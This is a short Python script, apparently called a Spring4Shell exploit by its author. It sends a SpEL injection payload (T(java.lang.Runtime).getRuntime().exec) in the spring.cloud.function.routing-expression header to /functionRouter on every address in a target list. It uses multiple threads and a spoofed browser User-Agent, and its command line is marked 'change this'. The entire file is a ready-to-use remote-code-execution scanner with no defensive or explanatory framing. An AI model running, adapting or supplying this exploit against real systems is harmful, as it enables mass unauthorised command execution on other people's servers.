# MADE BY NRPE | SPRING4SHELL #
import concurrent.futures
import sys
import requests
import logging
from functools import partial

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def rce(ip_address, cmd):
    payload = f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'
    url = f"http://{ip_address}/functionRouter"
    headers = {
        'spring.cloud.function.routing-expression': payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    return url, headers

def send_post_request(ip_address, cmd):
    url, headers = rce(ip_address, cmd)
    try:
        response = requests.post(url, headers=headers, data='d', verify=False, timeout=3)
        if response.status_code == 200:
            logging.info(f"{ip_address} - Exploit sent")
            return True
        else:
            logging.warning(f"{ip_address} - Failed: {response.status_code}")
            return False
    except requests.RequestException as e:
        logging.error(f"{ip_address} - Error: {e}")
        return False

def main():
    ip_file = "ips.txt"
    cmd = "id"  # change this
    
    try:
        with open(ip_file, "r") as file:
            ip_addresses = [ip.strip() for ip in file if ip.strip()]
    except FileNotFoundError:
        logging.error(f"File {ip_file} not found")
        sys.exit(1)
    
    success_count = 0
    failure_count = 0
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(send_post_request, ip, cmd): ip for ip in ip_addresses}
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                success_count += 1
            else:
                failure_count += 1
    
    logging.info(f"Complete: {success_count} succeeded, {failure_count} failed")

if __name__ == "__main__":
    main()
